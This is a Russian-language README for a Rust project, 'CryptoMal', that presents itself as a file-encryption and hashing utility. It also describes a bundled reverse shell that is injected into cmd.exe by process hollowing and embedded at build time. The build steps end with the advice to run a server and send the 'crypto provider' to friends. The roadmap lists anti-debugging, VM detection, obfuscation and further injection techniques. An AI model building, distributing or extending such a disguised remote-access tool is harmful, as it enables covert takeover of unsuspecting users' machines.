# CryptoMal

**CryptoMal** — утилита Rust для выполнения криптографических операций. Поддерживает шифрование и дешифрование файлов с использованием AES в режимах ECB, CBC, CTR и OFB, генерацию ключей на основе PBKDF2, вычисление хэшей SHA-256 и SHA-3. Проект пока только включает CLI-интерфейс и reverse shell для удаленного выполнения операций.

## Функции

- **Шифрование и дешифрование файлов**:
  - AES-128 в режимах ECB, CBC, CTR, OFB.
  - Генерация соли, IV и ключей.
  - Верификация с использованием HMAC-SHA256.

- **Генерация ключей**:
  - PBKDF2 с SHA-256.
  - Настраиваемые итерации и длина ключа.

- **Хэширование**:
  - Реализации SHA-256 и SHA-3-256.

- **Генерация случайных данных**:
  - CSPRNG на базе `rand` с тестами на статистические свойства.

- **Process Hollowing и Reverse Shell**:
  - Инъекция PE-файлов в процессы (cmd.exe) на Windows.
  - Удаленный shell с поддержкой крипто-команд.

- **CLI и тесты**:
  - Интерфейс на `clap`.
  - Unit-тесты для основных компонентов.
  - Нагрузочные тесты на файлах, равных размеру ОЗУ
  - NIST-тесты для ГПСЧ

> **Предупреждение**: Рекомендуется запуск на виртуальной ОС

## Установка

1. Установите cargo
2. Клонируйте репозиторий:
   ```bash
   git clone https://github.com/yourusername/CryptoMal.git
   cd CryptoMal
   ```
3. Сборка проекта:
   ```bash
   cargo build --release
   ```

## Использование
### Команды
- **Шифрование файла** (с паролем):
  ```bash
  cargo run -- encrypt --password mysecret --mode CBC input.txt output.enc
  ```
- **Дешифрование**:
  ```bash
  cargo run -- decrypt --password mysecret --mode CBC output.enc decrypted.txt
  ```
- **Генерация ключа**:
  ```bash
  cargo run -- derive --password mypass --salt mysalt --iterations 100000 --length 32
  ```
- **Хэширование файла**:
  ```bash
  cargo run -- dgst --algorithm sha256 input.txt
  ```
### Reverse Shell
1. Настройте конфигурацию в `.env` (нужно создать файл в корне проекта):
```
PAYLOAD_IP=127.0.0.1
PAYLOAD_PORT=8080
```
2. Соберите payload: `cargo build --release --bin reverse_shell`
3. Перенесите скомпилированный exe в каталог *src/process-hollowing*
4. Соберите проект: `cargo build --release --bin CryptoMal`
5. Далее необходимо поднять сервер, и можно отправлять криптопровайдер друзьям
6. Отправляйте команды (поодерживаются в том числе и для ос):
   ```
   encrypt --password pass input.txt output.enc
   ```

## Структура проекта

```
CryptoMal/
├── Cargo.toml          # Зависимости
├── src/
│   ├── main.rs         # CLI
│   ├── remote_crypto.rs # Reverse shell
│   ├── cryptor.rs      # Основной крипто-модуль
│   ├── generator.rs 
│   ├── key_manager/    # Генерация ключа и проверка на подлинность
│   ├── hash/           # SHA-256, SHA-3
│   ├── validate.rs     # Валидация вводимых в cli аргументов
│   └── process_hollowing/
│       └── job.rs      # Process hollowing (Windows)
│       ├── reverse_shell.exe # скомпилированный шелл
├── tests/              # Тесты
└── build.rs            # Внедрение PE в основной exe
```

## Тестирование

```bash
cargo test --release
```

Нагрузочный тест:
```bash
cargo test --release --test high_load_integration -- --no-capture
```

Для данных NIST:
```bash
cargo test generate_nist_data -- --no-capture
```
## В планах
1. Тотал рефакторинг
2. Следующие спринты
3. Новые фичи для удобства и безопасности пользователей:
   * Process Doppelgänging
   * Process Ghosting
   * Проверка на существующие в системе отладчики
   * Обнаружение запуска на VM
   * Обфускация
